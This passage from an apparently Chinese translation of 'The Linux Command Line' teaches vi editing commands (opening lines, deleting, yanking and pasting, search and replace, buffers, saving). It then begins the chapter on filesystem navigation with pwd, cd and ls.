<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>再次按 Esc 键退出插入模式。</p>
<p>正如我们所看到的，“A” 命令更有用，因为它在开始插入模式之前将光标移动到行的末尾。</p>
<h4 id="打开一行"><a href="#打开一行" class="headerlink" title="打开一行"></a>打开一行</h4><p>我们可以通过“打开”一行来插入文本的另一种方式。这在两行之间插入一个空行并进入插入模式。如表122所述，这有两个变体。</p>
<p><em>表 12-2：打开行的键</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>打开位置</strong></th>
</tr>
</thead>
<tbody><tr>
<td>o</td>
<td>当前行下方的新行</td>
</tr>
<tr>
<td>O</td>
<td>当前行上方的新行</td>
</tr>
</tbody></table>
<p>我们可以这样演示：将光标放在“第3行”上，然后输入 o。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>新的行在第三行下方打开，并且我们进入了插入模式。按 Esc 键退出插入模式。按 u 键撤销我们的更改。</p>
<p>按 O 键在光标上方打开行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>按 Esc 键退出插入模式，并按 u 键撤销我们的更改。</p>
<h4 id="删除文本"><a href="#删除文本" class="headerlink" title="删除文本"></a>删除文本</h4><p>正如我们可能预期的，vi 提供了多种删除文本的方式，所有这些方式都包含了两个关键按键中的一个。首先，x 命令将删除光标位置的字符。x 可以前置一个数字，指定要删除多少个字符。d 命令则更为通用。与 x 类似，它可以前置一个数字，指定要执行删除的次数。此外，d 命令总是跟随一个控制删除大小的移动命令。表12-3提供了一些示例：</p>
<p><em>表 12-3：文本删除命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>删除内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>当前字符</td>
</tr>
<tr>
<td>3x</td>
<td>当前字符及其后两个字符</td>
</tr>
<tr>
<td>dd</td>
<td>当前行</td>
</tr>
<tr>
<td>5dd</td>
<td>当前行及其后四行</td>
</tr>
<tr>
<td>dW</td>
<td>从当前光标位置到下一个单词的开头</td>
</tr>
<tr>
<td>d$</td>
<td>从当前光标位置到当前行的末尾</td>
</tr>
<tr>
<td>d0</td>
<td>从当前光标位置到行的开头</td>
</tr>
<tr>
<td>d^</td>
<td>从当前光标位置到行中第一个非空白字符</td>
</tr>
<tr>
<td>dG</td>
<td>从当前行到文件末尾</td>
</tr>
<tr>
<td>d20G</td>
<td>从当前行到文件的第二十行</td>
</tr>
</tbody></table>
<p>将光标放在文本的第一行的单词“It”上。重复按下 x 键，直到句子的其余部分被删除。接着，重复按 u 键，直到删除被撤销。</p>
<p>**注意：**真正的 vi 只支持单一级别的撤销。vim 支持多个级别。</p>
<p>再次尝试删除，这次使用 d 命令。将光标移动到“It”这个词上，并输入 dW 以删除这个单词。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>输入 d$ 以从光标位置删除到行末。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>按 dG 以从当前行删除到文件末尾。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br></pre></td></tr></table></figure>

<p>按 u 键三次以撤销删除。</p>
<h4 id="剪切、复制和粘贴文本"><a href="#剪切、复制和粘贴文本" class="headerlink" title="剪切、复制和粘贴文本"></a>剪切、复制和粘贴文本</h4><p>d 命令不仅可以删除文本，还可以“剪切”文本。每次使用 d 命令时，删除都会复制到一个粘贴缓冲区（可以认为是剪贴板），稍后我们可以使用 p 命令将缓冲区的内容粘贴到光标后，或使用 P 命令将其粘贴到光标前。</p>
<p>y 命令用于“复制”文本，其方式与 d 命令剪切文本的方式相似。表12-4提供了将 y 命令与各种移动命令结合使用的一些示例：</p>
<p><em>表 12-4：复制命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>复制内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>yy</td>
<td>当前行</td>
</tr>
<tr>
<td>5yy</td>
<td>当前行及其后四行</td>
</tr>
<tr>
<td>yW</td>
<td>从当前光标位置到下一个单词的开头</td>
</tr>
<tr>
<td>y$</td>
<td>从当前光标位置到当前行的末尾</td>
</tr>
<tr>
<td>y0</td>
<td>从当前光标位置到行的开头</td>
</tr>
<tr>
<td>y^</td>
<td>从当前光标位置到行中第一个非空白字符</td>
</tr>
<tr>
<td>yG</td>
<td>从当前行到文件末尾</td>
</tr>
<tr>
<td>y20G</td>
<td>从当前行到文件的第二十行</td>
</tr>
</tbody></table>
<p>让我们尝试一些复制和粘贴操作。将光标放在文本的第一行，并输入 yy 以复制当前行。接着，将光标移动到最后一行（使用 G），然后输入 p 以将行粘贴到当前行的下方。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br></pre></td></tr></table></figure>

<p>与之前一样，u 命令会撤销我们的更改。将光标仍然放在文件的最后一行，然后输入 P 以将文本粘贴到当前行的上方。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>尝试在表12-4中的其他y命令，并了解p和P命令的行为。完成后，请将文件恢复到其原始状态。</p>
<h4 id="合并行"><a href="#合并行" class="headerlink" title="合并行"></a>合并行</h4><p>vi 对行的概念相当严格。通常情况下，不能将光标移动到行尾并删除行尾字符以将一行与其下一行合并。因此，vi 提供了一个特定的命令 J（不应与用于光标移动的 j 混淆）来合并行。</p>
<p>如果我们将光标放在第3行并输入 J 命令，会发生以下情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3 Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<h3 id="搜索和替换"><a href="#搜索和替换" class="headerlink" title="搜索和替换"></a>搜索和替换</h3><p>vi 有根据搜索将光标移动到位置的能力。它可以在单行或整个文件上执行此操作。还可以根据用户的选择进行或不进行文本替换。</p>
<h4 id="在行内搜索"><a href="#在行内搜索" class="headerlink" title="在行内搜索"></a>在行内搜索</h4><p>f 命令搜索一行并将光标移动到指定字符的下一个实例。例如，命令 fa 会将光标移动到当前行中字符 a 的下一个实例。在行内进行字符搜索后，可以通过键入分号重复搜索。</p>
<h4 id="在整个文件中搜索"><a href="#在整个文件中搜索" class="headerlink" title="在整个文件中搜索"></a>在整个文件中搜索</h4><p>要将光标移到下一个单词或短语的实例，使用 &#x2F; 命令。</p>
<p>这与我们之前在 less 程序中学到的方式相同。当您输入 &#x2F; 命令时，屏幕底部会出现 &#x2F;。接下来，输入要搜索的单词或短语，然后按 Enter 键。光标将移动到包含搜索字符串的下一个位置。可以使用 n 命令重复搜索。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>将光标放在文件的第一行上。然后输入并按 Enter 键。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/Line</span><br></pre></td></tr></table></figure>

<p>光标将移动到第2行。接着，键入 n，光标将移动到第3行。重复 n 命令会使光标向下移动，直到找不到匹配项。到目前为止，我们只使用了单词和短语作为搜索模式，但 vi 允许使用<em>正则表达式</em>，这是一种表示复杂文本模式的强大方法。我们将在第19章“正则表达式”中详细介绍正则表达式。</p>
<h4 id="全局搜索和替换"><a href="#全局搜索和替换" class="headerlink" title="全局搜索和替换"></a>全局搜索和替换</h4><p>vi 使用 ex 命令在一系列行或整个文件上执行搜索和替换操作（在 vi 中称为<em>替换</em>）。要将文件中的单词“Line”更改为“line”，我们会输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:%s/Line/line/g</span><br></pre></td></tr></table></figure>

<p>让我们将此命令分解为各个部分，并查看每个部分的作用（参见表12-5）。</p>
<p><em>表 12-5：全局搜索和替换示例语法</em></p>
<table>
<thead>
<tr>
<th><strong>项目</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>:</td>
<td>冒号字符开始 ex 命令。</td>
</tr>
<tr>
<td>%</td>
<td>指定操作的行范围。% 是一个快捷方式，意味着从第一行到最后一行。或者，范围可以是 1,5（因为我们的文件有五行）或 1,$，这意味着“从第1行到文件的最后一行”。如果省略行范围，则仅在当前行上执行操作。</td>
</tr>
<tr>
<td>s</td>
<td>指定操作。在这种情况下，是替换（搜索和替换）。</td>
</tr>
<tr>
<td>&#x2F;Line&#x2F;line&#x2F;</td>
<td>指定搜索模式和替换文本。</td>
</tr>
<tr>
<td>g</td>
<td>在每一行中执行搜索和替换的“全局”意义。如果省略，每行上搜索字符串的第一个实例将被替换。</td>
</tr>
</tbody></table>
<p>执行我们的搜索和替换命令后，文件如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">line 2</span><br><span class="line">line 3</span><br><span class="line">line 4</span><br><span class="line">line 5</span><br></pre></td></tr></table></figure>

<p>我们还可以在替换命令后添加 c，以实现用户确认。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:%s/line/Line/gc</span><br></pre></td></tr></table></figure>

<p>这个命令将使我们的文件返回到之前的形式；但在每次替换之前，vi 都会停下来并询问我们确认替换的消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">replace with Line (y/n/a/q/l/^E/^Y)?</span><br></pre></td></tr></table></figure>

<p>括号内的每个字符都是一个可能的选择，如表12-6所描述。</p>
<p><em>表 12-6：替换确认键</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>y</td>
<td>执行替换。</td>
</tr>
<tr>
<td>n</td>
<td>跳过此模式的实例。</td>
</tr>
<tr>
<td>a</td>
<td>在此模式及其后续实例上执行替换。</td>
</tr>
<tr>
<td>q 或 Esc</td>
<td>停止替换。</td>
</tr>
<tr>
<td>l</td>
<td>执行此替换然后退出。这是“last”的缩写。</td>
</tr>
<tr>
<td>Ctrl-e, Ctrl-y</td>
<td>向下滚动和向上滚动，分别用于查看拟议替换的上下文。</td>
</tr>
</tbody></table>
<p>如果您输入 y，将执行替换，输入 n 将导致 vi 跳过此实例并继续下一个。</p>
<h3 id="编辑多个文件"><a href="#编辑多个文件" class="headerlink" title="编辑多个文件"></a>编辑多个文件</h3><p>通常，同时编辑多个文件非常有用。您可能需要对多个文件进行更改，或者可能需要将一个文件的内容复制到另一个文件中。使用 vi，我们可以通过在命令行上指定它们来打开多个文件进行编辑。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi file1 file2 file3...</span><br></pre></td></tr></table></figure>

<p>让我们退出当前的 vi 会话并创建一个新文件进行编辑。输入 :wq 退出 vi，保存我们修改后的文本。接下来，我们将在我们的主目录中创建一个额外的文件以供我们玩耍。我们将通过捕获 ls 命令的一些输出来创建该文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>让我们使用 vi 编辑我们的旧文件和新文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ vi foo.txt ls-output.txt</span><br></pre></td></tr></table></figure>

<p>vi 将启动，并且我们将在屏幕上看到第一个文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<h4 id="在文件之间切换"><a href="#在文件之间切换" class="headerlink" title="在文件之间切换"></a>在文件之间切换</h4><p>要从一个文件切换到下一个文件，请使用以下 ex 命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:bn</span><br></pre></td></tr></table></figure>

<p>要返回到上一个文件，请使用以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:bp</span><br></pre></td></tr></table></figure>

<p>虽然我们可以从一个文件切换到另一个文件，但 vi 实施了一个策略，防止我们在当前文件有未保存的更改时切换文件。要强制 vi 切换文件并放弃您的更改，请在命令中添加一个感叹号（!）。</p>
<p>除了上面描述的切换方法外，vim（以及某些版本的 vi）提供了一些 ex 命令，使多个文件更容易管理。我们可以使用 :buffers 命令查看正在编辑的文件列表。这样做会在显示底部显示文件列表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:buffers</span><br><span class="line"> 1 %a &quot;foo.txt&quot; line 1</span><br><span class="line"> 2 &quot;ls-output.txt&quot; line 0</span><br><span class="line">Press ENTER or type command to continue </span><br></pre></td></tr></table></figure>

<p>要切换到另一个缓冲区（文件），输入 :buffer，然后是我们想要编辑的缓冲区的编号。例如，要从包含文件 foo.txt 的缓冲区1切换到包含文件 ls-output.txt 的缓冲区2，我们将输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:buffer 2</span><br></pre></td></tr></table></figure>

<p>我们的屏幕现在显示第二个文件。另一种更改缓冲区的方法是使用先前提到的 :bn（缩写为 buffer next）和 :bp（缩写为 buffer previous）命令。</p>
<h4 id="打开其他文件进行编辑"><a href="#打开其他文件进行编辑" class="headerlink" title="打开其他文件进行编辑"></a>打开其他文件进行编辑</h4><p>我们也可以在当前编辑会话中添加文件。使用 :e（缩写为“edit”）后跟文件名的 ex 命令将打开一个额外的文件。让我们结束当前的编辑会话并返回命令行。</p>
<p>只用一个文件再次启动 vi。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ vi foo.txt</span><br></pre></td></tr></table></figure>

<p>要添加我们的第二个文件，请输入以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:e ls-output.txt</span><br></pre></td></tr></table></figure>

<p>它应该会显示在屏幕上。我们可以验证第一个文件仍然存在。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:buffers</span><br><span class="line"> 1 # &quot;foo.txt&quot; line 1</span><br><span class="line"> 2 %a &quot;ls-output.txt&quot; line 0</span><br><span class="line">Press ENTER or type command to continue</span><br></pre></td></tr></table></figure>

<h4 id="从一个文件复制内容到另一个文件"><a href="#从一个文件复制内容到另一个文件" class="headerlink" title="从一个文件复制内容到另一个文件"></a>从一个文件复制内容到另一个文件</h4><p>在编辑多个文件时，我们经常会想要将一个文件的一部分内容复制到另一个正在编辑的文件中。这可以通过使用我们之前使用的常规复制和粘贴命令轻松完成。我们可以这样演示。首先，使用我们的两个文件，通过输入以下内容切换到缓冲区 1（foo.txt）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:buffer 1</span><br></pre></td></tr></table></figure>

<p>这应该会给我们这个结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br></pre></td></tr></table></figure>

<p>接下来，将光标移动到第一行，然后输入 yy 以复制该行。</p>
<p>通过输入以下内容切换到第二个缓冲区：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:buffer 2</span><br></pre></td></tr></table></figure>

<p>现在屏幕将包含一些文件列表，如下所示（这里仅显示部分内容）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 343700</span><br><span class="line">-rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [</span><br><span class="line">-rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm</span><br><span class="line">-rwxr-xr-x 1 root root 111276 2018-01-31 13:36 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec</span><br><span class="line">-rwxr-xr-x 1 root root 11532 2017-05-04 17:43 aafire</span><br><span class="line">-rwxr-xr-x 1 root root 7292 2017-05-04 17:43 aainfo</span><br></pre></td></tr></table></figure>

<p>将光标移动到第一行，然后通过输入 p 命令粘贴我们从前一个文件中复制的行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 343700</span><br><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">-rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [</span><br><span class="line">-rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm</span><br><span class="line">-rwxr-xr-x 1 root root 111276 2018-01-31 13:36 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec</span><br><span class="line">-rwxr-xr-x 1 root root 11532 2017-05-04 17:43 aafire</span><br><span class="line">-rwxr-xr-x 1 root root 7292 2017-05-04 17:43 aainfo</span><br></pre></td></tr></table></figure>

<h4 id="将一个完整文件插入到另一个文件中"><a href="#将一个完整文件插入到另一个文件中" class="headerlink" title="将一个完整文件插入到另一个文件中"></a>将一个完整文件插入到另一个文件中</h4><p>也可以将一个完整的文件插入到我们正在编辑的一个文件中。为了看到这个过程，请结束我们的 vi 会话，并用只有一个文件重新开始。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ vi ls-output.txt</span><br></pre></td></tr></table></figure>

<p>我们再次会看到我们的文件列表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 343700</span><br><span class="line">-rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [</span><br><span class="line">-rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm</span><br><span class="line">-rwxr-xr-x 1 root root 111276 2018-01-31 13:36 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec</span><br><span class="line">-rwxr-xr-x 1 root root 11532 2017-05-04 17:43 aafire</span><br><span class="line">-rwxr-xr-x 1 root root 7292 2017-05-04 17:43 aainfo</span><br></pre></td></tr></table></figure>

<p>将光标移动到第三行，然后输入以下 ex 命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:r foo.txt</span><br></pre></td></tr></table></figure>

<p>:r 命令（“read”的缩写）将指定的文件插入到光标位置下方。现在我们的屏幕应该看起来像这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 343700</span><br><span class="line">-rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [</span><br><span class="line">-rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm</span><br><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br><span class="line">Line 2</span><br><span class="line">Line 3</span><br><span class="line">Line 4</span><br><span class="line">Line 5</span><br><span class="line">-rwxr-xr-x 1 root root 111276 2018-01-31 13:36 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec</span><br><span class="line">-rwxr-xr-x 1 root root 11532 2017-05-04 17:43 aafire</span><br><span class="line">-rwxr-xr-x 1 root root 7292 2017-05-04 17:43 aainfo</span><br></pre></td></tr></table></figure>

<h3 id="保存我们的工作-1"><a href="#保存我们的工作-1" class="headerlink" title="保存我们的工作"></a>保存我们的工作</h3><p>像 vi 中的其他一切一样，有几种不同的方法可以保存我们编辑过的文件。我们已经覆盖了 ex 命令 :w，但还有一些其他命令可能也会对我们有帮助。</p>
<p>在命令模式下，输入 ZZ 会保存当前文件并退出 vi。同样，ex 命令 :wq 将组合 :w 和 :q 命令成一个命令，既保存文件又退出。</p>
<p>:w 命令还可以指定一个可选的文件名。这就像“另存为…”。例如，如果我们正在编辑 foo.txt 并想保存一个名为 foo1.txt 的备份版本，我们将输入以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:w foo1.txt</span><br></pre></td></tr></table></figure>

<p>**注意：**虽然此命令将文件另存为新名称，但它并不更改我们正在编辑的文件名称。当我们继续编辑时，我们仍然编辑 foo.txt，而不是 foo1.txt。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有了这些基本技能，我们现在可以执行维护典型 Linux 系统所需的大部分文本编辑。长期学习并经常使用 vim 会带来长远的好处。由于 vi 风格的编辑器在 Unix 文化中有深厚的根基，我们将看到许多其他受其设计影响的程序。less 就是这种影响的一个很好的例子。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><p>即使在本章中我们已经覆盖了这么多内容，我们也只是触及了 vi 和 vim 的皮毛。以下是一些在线资源，可以帮助您继续掌握 vi：</p>
<ul>
<li><em>Vim, with Vigor</em> - 这是 LinuxCommand.org 上的一个进阶教程，将读者提升到中级技能水平。您可以在这里找到它：<span class="exturl" data-url="aHR0cDovL2xpbnV4Y29tbWFuZC5vcmcvbGMzX2Fkdl92aW12aWdvci5waHA=">http://linuxcommand.org/lc3_adv_vimvigor.php<i class="fa fa-external-link-alt"></i></span></li>
<li><em>Learning The vi Editor</em> - 这是来自 Wikipedia 的一个 Wikibook，提供了 vi 以及包括 vim 在内的几个相似编辑器的简明指南。您可以在这里找到它：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lib29rcy5vcmcvd2lraS9WaQ==">http://en.wikibooks.org/wiki/Vi<i class="fa fa-external-link-alt"></i></span></li>
<li><em>The Vim Book</em> - vim 项目有一本570页的书，涵盖了 vim 的（几乎）所有功能。您可以在这里找到它：<span class="exturl" data-url="ZnRwOi8vZnRwLnZpbS5vcmcvcHViL3ZpbS9kb2MvYm9vay92aW1ib29rLU9QTC5wZGY=">ftp://ftp.vim.org/pub/vim/doc/book/vimbook-OPL.pdf<i class="fa fa-external-link-alt"></i></span></li>
<li>Bill Joy，vi 的创建者的维基百科文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9CaWxsX0pveQ==">http://en.wikipedia.org/wiki/Bill_Joy<i class="fa fa-external-link-alt"></i></span></li>
<li>Bram Moolenaar，vim 作者的维基百科文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9CcmFtX01vb2xlbmFhcg==">http://en.wikipedia.org/wiki/Bram_Moolenaar<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>导航</title>
    <url>/2024/03/2-navigation/</url>
    <content><![CDATA[<h2 id="2-–-导航"><a href="#2-–-导航" class="headerlink" title="2 – 导航"></a>2 – 导航</h2><p>除了学会如何打字之外，我们需要学习的第一件事是如何在Linux系统上导航文件系统。在本章中，我们将介绍以下命令：</p>
<ul>
<li><code>pwd</code> – 打印当前工作目录的名称</li>
<li><code>cd</code> – 切换目录</li>
<li><code>ls</code> – 列出目录内容</li>
</ul>
<span id="more"></span>

<h3 id="理解文件系统树"><a href="#理解文件系统树" class="headerlink" title="理解文件系统树"></a>理解文件系统树</h3><p>像Windows一样，类Unix操作系统（如Linux）以所谓的分层目录结构组织其文件。这意味着它们以目录树状的模式组织，这些目录（在其他系统中有时称为文件夹）可能包含文件和其他目录。文件系统中的第一个目录称为根目录。根目录包含文件和子目录，这些子目录又包含更多的文件和子目录，依此类推。</p>
<p>请注意，不像Windows，其为每个存储设备都有一个单独的文件系统树，类Unix系统如Linux始终只有一个文件系统树，而不管连接到计算机的有多少驱动器或存储设备。存储设备会按照系统管理员（负责系统维护的人）的喜好连接（或更正式地说，挂载）到树的各个点。</p>
<h3 id="当前工作目录"><a href="#当前工作目录" class="headerlink" title="当前工作目录"></a>当前工作目录</h3><p>大多数人可能都熟悉图形文件管理器，该文件管理器将文件系统树显示为图1所示。请注意，该树通常是倒立显示的，即根在顶部，各个分支向下延伸。</p>
<p>但是，命令行中没有图片，因此为了浏览文件系统树，我们需要以不同的方式思考它。</p>
<p><img src="/images/2024/Picture1.png"></p>
<p><em>图1：由图形文件管理器显示的文件系统树</em></p>
<p>想象一下，文件系统是一个倒置树形状的迷宫，我们可以站在其中间。在任何给定的时刻，我们都在一个单独的目录内，我们可以看到包含在该目录中的文件以及通向我们上面的目录（称为<em>父目录</em>）和我们下面的任何子目录的路径。我们站在的目录称为<em>当前工作目录</em>。要显示当前工作目录，我们使用<code>pwd</code>（打印当前工作目录）命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ pwd</span><br><span class="line">/home/me</span><br></pre></td></tr></table></figure>

<p>当我们首次登录系统时（或启动终端仿真器会话时），我们的当前工作目录被设置为我们的<em>主目录</em>。每个用户帐户都有其自己的主目录，这是普通用户被允许写入文件的唯一地方。</p>
<h3 id="列出目录的内容"><a href="#列出目录的内容" class="headerlink" title="列出目录的内容"></a>列出目录的内容</h3><p>要列出当前工作目录中的文件和目录，我们使用<code>ls</code>命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls</span><br></pre></td></tr></table></figure>

<p>列出目录的内容可能类似于：</p>
<pre><code>Desktop Documents Music Pictures Public Templates Videos
</code></pre>
<p>实际上，我们可以使用<code>ls</code>命令列出任何目录的内容，而不仅仅是当前工作目录，并且它还有许多其他有趣的功能。我们将在下一章中更多地了解<code>ls</code>。</p>
<h3 id="更改当前工作目录"><a href="#更改当前工作目录" class="headerlink" title="更改当前工作目录"></a>更改当前工作目录</h3><p>要更改我们的工作目录（我们站在树形迷宫中的位置），我们使用<code>cd</code>命令。为此，请输入<code>cd</code>，然后是所需工作目录的<em>路径名</em>。路径名是我们沿树的分支走到所需目录的路径。我们可以以两种不同的方式指定路径名；作为<em>绝对路径名</em>或<em>相对路径名</em>。首先处理绝对路径名。</p>
<h4 id="绝对路径名"><a href="#绝对路径名" class="headerlink" title="绝对路径名"></a>绝对路径名</h4><p>绝对路径名以根目录开头，并按树的分支逐级跟随，直到完成到达所需目录或文件的路径。例如，在我们的系统上有一个目录，其中安装了大多数系统程序。该目录的路径名为<code>/usr/bin</code>。这意味着从根目录开始（由路径名中的前导斜杠表示），有一个名为 “usr” 的目录，其中包含一个名为 “bin” 的目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cd /usr/bin</span><br><span class="line">[me@linuxbox bin]$ pwd</span><br><span class="line">/usr/bin</span><br><span class="line">[me@linuxbox bin]$ ls</span><br><span class="line">...（列出许多文件）...</span><br></pre></td></tr></table></figure>

<p>现在我们可以看到，我们已将当前工作目录更改为<code>/usr/bin</code>，并且它充满了文件。注意shell提示符已经改变了吗？为了方便起见，通常会自动设置为显示工作目录的名称。</p>
<h4 id="相对路径名"><a href="#相对路径名" class="headerlink" title="相对路径名"></a>相对路径名</h4><p>绝对路径名从根目录开始并导致其目标，而相对路径名则从工作目录开始。为此，它使用了一些特殊的符号来表示文件系统树中的相对位置。这些特殊的符号是 “.”（点）和 “..”（点 点）。</p>
<p>“.” 符号指的是工作目录，而 “..” 符号指的是工作目录的父目录。以下是它的工作原理。让我们再次将工作目录更改为<code>/usr/bin</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cd /usr/bin</span><br><span class="line">[me@linuxbox bin]$ pwd</span><br><span class="line">/usr/bin</span><br></pre></td></tr></table></figure>

<p>现在假设我们想将工作目录更改为<code>/usr/bin</code> 的上一级目录，即<code>/usr</code>。我们可以通过两种不同的方式来实现，即使用绝对路径名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox bin]$ cd /usr</span><br><span class="line">[me@linuxbox usr]$ pwd</span><br><span class="line">/usr</span><br></pre></td></tr></table></figure>

<p>或者，使用相对路径名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox bin]$ cd ..</span><br><span class="line">[me@linuxbox usr]$ pwd</span><br><span class="line">/usr</span><br></pre></td></tr></table></figure>

<p>两种不同的方法，相同的结果。我们应该使用哪一个？那个需要输入最少的那个！</p>
<p>同样，我们可以以两种不同的方式从<code>/usr</code> 更改工作目录到 <code>/usr/bin</code>，即使用绝对路径名：</p>
